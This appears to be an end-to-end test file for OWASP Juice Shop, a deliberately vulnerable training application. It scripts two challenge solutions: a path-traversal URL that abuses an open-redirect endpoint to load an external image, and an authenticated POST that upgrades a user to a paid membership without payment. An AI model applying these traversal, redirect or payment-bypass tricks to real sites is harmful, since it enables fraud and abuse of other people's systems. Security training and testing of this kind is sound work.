/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const request = require('request')

describe('/#/deluxe-membership', () => {
  describe('challenge "svgInjection"', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })

    it('should be possible to pass in a forgotten test parameter abusing the redirect-endpoint to load an external image', () => {
      browser.get(protractor.basePath + '/#/deluxe-membership?testDecal=' + encodeURIComponent('../../../..' + protractor.basePath + '/redirect?to=https://placekitten.com/g/200/100?x=https://github.com/bkimminich/juice-shop'))
    })

    protractor.expect.challengeSolved({ challenge: 'Cross-Site Imaging', category: 'Path transversal', wafshouldblock: "Yes" })
  })

  describe('challenge "freeDeluxe"', () => {
    protractor.beforeEach.login({ email: 'jim@' + config.get('application.domain'), password: 'ncc-1701' })

    it('should upgrade to deluxe for free by making a post request to /rest/deluxe-membership by setting the paymentMode parameter to null', () => {
      browser.get(protractor.basePath + '/#/')
      browser.manage().getCookie('token').then((token) => {
        request.post(browser.baseUrl + '/rest/deluxe-membership', {
          headers: { Authorization: 'Bearer ' + token.value }
        }, (err, response, body) => {
          expect(err).not.toBeTruthy()
          expect(JSON.parse(body).status).toEqual('success')
          protractor.expect.challengeSolved({ challenge: 'Deluxe Fraud', category: 'Improper Input Validation', wafshouldblock: "No" })
        })
      })
    })
  })
})
